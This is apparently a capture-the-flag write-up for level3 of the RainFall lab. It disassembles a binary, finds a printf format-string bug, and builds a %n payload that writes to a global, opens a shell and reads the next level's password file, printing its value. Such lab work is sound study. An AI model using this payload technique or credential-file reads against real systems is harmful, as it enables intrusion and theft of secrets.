@@ -1,0 +1,137 @@
+  GCC stack protector support:            Enabled
+  Strict user copy checks:                Disabled
+  Restrict /dev/mem access:               Enabled
+  Restrict /dev/kmem access:              Enabled
+  grsecurity / PaX: No GRKERNSEC
+  Kernel Heap Hardening: No KERNHEAP
+ System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
+
+level3@RainFall:~$ ls
+level3
+
+level3@RainFall:~$ gdb level3
+
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+0x08048344  _init
+0x08048390  printf
+0x08048390  printf@plt
+0x080483a0  fgets
+0x080483a0  fgets@plt
+0x080483b0  fwrite
+0x080483b0  fwrite@plt
+0x080483c0  system
+0x080483c0  system@plt
+0x080483d0  __gmon_start__
+0x080483d0  __gmon_start__@plt
+0x080483e0  __libc_start_main
+0x080483e0  __libc_start_main@plt
+0x080483f0  _start
+0x08048420  __do_global_dtors_aux
+0x08048480  frame_dummy
+0x080484a4  v
+0x0804851a  main
+0x08048530  __libc_csu_init
+0x080485a0  __libc_csu_fini
+0x080485a2  __i686.get_pc_thunk.bx
+0x080485b0  __do_global_ctors_aux
+0x080485dc  _fini
+
+(gdb) disass main
+Dump of assembler code for function main:
+   0x0804851a <+0>:     push   %ebp
+   0x0804851b <+1>:     mov    %esp,%ebp
+   0x0804851d <+3>:     and    $0xfffffff0,%esp
+   0x08048520 <+6>:     call   0x80484a4 <v>
+   0x08048525 <+11>:    leave
+   0x08048526 <+12>:    ret
+End of assembler dump.
+
+(gdb) disass v
+Dump of assembler code for function v:
+   0x080484a4 <+0>:     push   %ebp
+   0x080484a5 <+1>:     mov    %esp,%ebp
+   0x080484a7 <+3>:     sub    $0x218,%esp
+   0x080484ad <+9>:     mov    0x8049860,%eax
+   0x080484b2 <+14>:    mov    %eax,0x8(%esp)
+   0x080484b6 <+18>:    movl   $0x200,0x4(%esp)
+   0x080484be <+26>:    lea    -0x208(%ebp),%eax
+   0x080484c4 <+32>:    mov    %eax,(%esp)
+   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
+   0x080484cc <+40>:    lea    -0x208(%ebp),%eax
+   0x080484d2 <+46>:    mov    %eax,(%esp)
+   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
+   0x080484da <+54>:    mov    0x804988c,%eax
+   0x080484df <+59>:    cmp    $0x40,%eax
+   0x080484e2 <+62>:    jne    0x8048518 <v+116>
+   0x080484e4 <+64>:    mov    0x8049880,%eax
+   0x080484e9 <+69>:    mov    %eax,%edx
+   0x080484eb <+71>:    mov    $0x8048600,%eax
+   0x080484f0 <+76>:    mov    %edx,0xc(%esp)
+   0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
+   0x080484fc <+88>:    movl   $0x1,0x4(%esp)
+   0x08048504 <+96>:    mov    %eax,(%esp)
+   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
+   0x0804850c <+104>:   movl   $0x804860d,(%esp)
+   0x08048513 <+111>:   call   0x80483c0 <system@plt>
+   0x08048518 <+116>:   leave
+   0x08048519 <+117>:   ret
+End of assembler dump.
+
+(gdb) x /s 0x8049860
+0x8049860 <stdin@@GLIBC_2.0>:    ""
+
+(gdb) x /s 0x804988c
+0x804988c <m>:   ""
+
+(gdb) x /s 0x8049880
+0x8049880 <stdout@@GLIBC_2.0>:   ""
+
+(gdb) x /s 0x8048600
+0x8048600:       "Wait what?!\n"
+
+(gdb) x /s 0x804860d
+0x804860d:       "/bin/sh"
+
+
+after converting the code we find https://stackoverflow.com/questions/46776664/exploiting-printf-vulnerability-in-c
+whitch is a good vulnerability to exploit.
+
+with https://www.geeksforgeeks.org/g-fact-31/ we find out how %n works, so we must find a way to get the address of "m"
+
+putting a strange input like:
+
+%x_%x_%x_%x_%x_%x_%x
+
+we find:
+
+200_b7fd1ac0_b7ff37d0_255f7825_78255f78_5f78255f_255f7825
+
+then we notice that
+
+25	5f	78	25		78	25	5f	78
+%	_	x	%		x	%	_	x
+
+so we are getting the input!!
+we try:
+
+level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08" + "_%x" * 5)' > /tmp/exploit
+level3@RainFall:~$ cat /tmp/exploit | ./level3
+_200_b7fd1ac0_b7ff37d0_804988c_5f78255f
+
+so we can use the same address + three %x and the %n with some garbage in between:
+"\x8c\x98\x04\x08" + junk + "%x%x%x" + "%n"
+4 + junk + 3 + 7 + 7 = 64	=>	junk = 41
+
+then:
+level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08" + "A" * 41 + "%x%x%x%n")' > /tmp/exploit
+
+level3@RainFall:~$ cat /tmp/exploit - | ./level3
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA200b7fd1ac0b7ff37d0
+Wait what?!
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
